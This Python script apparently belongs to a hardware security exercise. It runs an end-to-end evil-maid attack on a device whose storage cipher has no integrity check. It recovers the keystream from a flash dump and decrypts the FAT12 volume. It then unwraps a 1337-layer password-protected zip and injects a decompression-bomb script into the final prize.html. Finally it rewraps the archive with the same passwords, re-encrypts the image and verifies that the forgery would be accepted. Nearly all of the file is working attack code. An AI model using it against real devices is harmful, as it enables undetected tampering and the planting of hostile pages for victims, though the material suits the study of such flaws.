#!/usr/bin/env python3
"""attack2 evil-maid, full payload swap: replace the prize with a malicious one.

The storage cipher has no MAC or signature (CWE-345), so an attacker who knows the
keystream can rewrite the volume and the device serves it back as genuine content.
This script does the whole chain end to end:

  1. recover the keystream from a cold dump (attack3 engine, no firmware/PIN)
  2. decrypt the storage into its FAT12 volume
  3. pull your_prize.zip out, peel its 1337 password layers to the final prize.html
  4. swap prize.html for a decompression-bomb page (bomb_html) and rebuild the
     matryoshka with the SAME per-layer passwords, so every layer still looks real
  5. drop the forged your_prize.zip back into the volume and re-encrypt it
  6. the result is the ciphertext an evil-maid writes to the flash (chip programmer,
     BOOTSEL reflash, or WRITE(10) after any unlocked session)

The victim peels the layers exactly as before -- the passwords are unchanged -- and
opens "the prize" in a browser, where the swapped page runs. Requires mtools and 7z.
"""
import os
import subprocess
import sys
import tempfile
import zipfile

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "attack3"))
import recover_keystream as R  # noqa: E402  (shared cipher math, single source)
import matryoshka as M         # noqa: E402
import bomb_html               # noqa: E402


def _mtool(*args):
    r = subprocess.run(args, capture_output=True, text=True)
    if r.returncode != 0:
        raise RuntimeError(f"{' '.join(args)} -> rc {r.returncode}\n{r.stderr[-300:]}")
    return r.stdout


def build_evil_prize(work, orig_prize_zip):
    """Turn the real your_prize.zip into one whose final layer is a bomb page.

    Returns (new_prize_path, depth, original_final_size, bomb_size).
    """
    # the outer prize.zip is a plain (unencrypted) zip: readme.txt + layers.zip
    with zipfile.ZipFile(orig_prize_zip) as z:
        names = z.namelist()
        z.extractall(work)
    layers_zip = os.path.join(work, "layers.zip")

    peel = os.path.join(work, "peel")
    os.makedirs(peel)
    final_path, depth = M.unwrap(peel, layers_zip)
    orig_final_size = os.path.getsize(final_path)

    # inject the bomb INTO the original prize.html, keeping its name and its markup:
    # the page still renders the same, so the victim sees the expected prize
    original = open(final_path, "rb").read()
    injected = bomb_html.inject_bomb(original)
    with open(final_path, "wb") as f:
        f.write(injected)

    new_layers = M.rewrap(peel, final_path, depth)          # same passwords 1..depth
    os.replace(new_layers, layers_zip)

    # rebuild the outer prize.zip with the original member set (readme.txt + layers.zip)
    new_prize = os.path.join(work, "your_prize_evil.zip")
    with zipfile.ZipFile(new_prize, "w", zipfile.ZIP_DEFLATED) as z:
        for name in names:
            z.write(os.path.join(work, name), arcname=name)
    return new_prize, depth, orig_final_size, len(injected)


def main(argv):
    if len(argv) < 2:
        print(__doc__)
        return 2
    dump = open(argv[1], "rb").read()
    out_path = argv[2] if len(argv) > 2 else "forged_storage.bin"

    ct = dump[R.STORAGE_OFF:R.STORAGE_OFF + R.STORAGE_LEN]
    if len(ct) < R.STORAGE_LEN:
        print(f"[!] dump too short: need storage at 0x{R.STORAGE_OFF:x}+0x{R.STORAGE_LEN:x}")
        return 2

    print("[*] recovering keystream from the cold dump (attack3 engine)...")
    res = R.recover(ct)
    if res is None:
        print("[FAIL] keystream recovery did not converge")
        return 1
    A, seed, B, W = res
    print(f"    B=0x{B:08X} W=0x{W:08X} A=0x{A:08X} seed=0x{seed:08X}")

    pt = R.decrypt_all(ct, A, seed, B, W)                   # plaintext FAT12 volume

    with tempfile.TemporaryDirectory() as work:
        img = os.path.join(work, "volume.img")
        with open(img, "wb") as f:
            f.write(pt)

        orig_prize = os.path.join(work, "your_prize.zip")
        _mtool("mcopy", "-i", img, "::your_prize.zip", orig_prize)

        print("[*] peeling 1337 layers and injecting the bomb into the final prize.html...")
        new_prize, depth, orig_final, injected_sz = build_evil_prize(work, orig_prize)
        print(f"    depth={depth} layers; prize.html {orig_final} -> {injected_sz} bytes "
              f"(same markup + injected script)")

        # swap the file in the volume; the forged prize is smaller, so it fits
        _mtool("mdel", "-i", img, "::your_prize.zip")
        _mtool("mcopy", "-i", img, new_prize, "::your_prize.zip")

        pt2 = open(img, "rb").read()

    ct2 = R.decrypt_all(pt2, A, seed, B, W)                 # XOR is symmetric: this re-encrypts
    forged_dump = bytearray(dump)
    forged_dump[R.STORAGE_OFF:R.STORAGE_OFF + R.STORAGE_LEN] = ct2

    with open(out_path, "wb") as f:
        f.write(ct2)
    dump_out = out_path.rsplit(".", 1)[0] + "_fulldump.bin"
    with open(dump_out, "wb") as f:
        f.write(forged_dump)
    print(f"[*] wrote forged storage: {out_path} ({len(ct2)} bytes)")
    print(f"[*] wrote forged full dump: {dump_out} ({len(forged_dump)} bytes)")

    # verification: the device would decrypt the forged storage back to our volume,
    # the matryoshka still opens with the number passwords, and the final file is the bomb.
    ok = _verify(ct2, A, seed, B, W)
    print(f"[{'PASS' if ok else 'FAIL'}] forged volume decrypts back, layers intact, "
          f"final page is the bomb -- nothing rejected it (CWE-345)")
    return 0 if ok else 1


def _verify(ct2, A, seed, B, W):
    pt = R.decrypt_all(ct2, A, seed, B, W)                  # what the device read10 would serve
    with tempfile.TemporaryDirectory() as work:
        img = os.path.join(work, "v.img")
        with open(img, "wb") as f:
            f.write(pt)
        listing = _mtool("mdir", "-i", img, "::")
        if "YOUR_P" not in listing.upper():
            print("    [verify] your_prize.zip missing from volume")
            return False
        prize = os.path.join(work, "your_prize.zip")
        _mtool("mcopy", "-i", img, "::your_prize.zip", prize)
        with zipfile.ZipFile(prize) as z:
            z.extractall(work)
        peel = os.path.join(work, "peel")
        os.makedirs(peel)
        final_path, depth = M.unwrap(peel, os.path.join(work, "layers.zip"))
        body = open(final_path, "rb").read()
        is_bomb = b"DecompressionStream" in body and b"PROOF OF CONCEPT" in body
        looks_original = b"<img" in body.lower()            # rickroll image still present
        print(f"    [verify] {depth} layers open with passwords 1..{depth}; "
              f"final {os.path.basename(final_path)}: bomb={is_bomb}, original markup kept={looks_original}")
        return is_bomb and looks_original


if __name__ == "__main__":
    sys.exit(main(sys.argv))
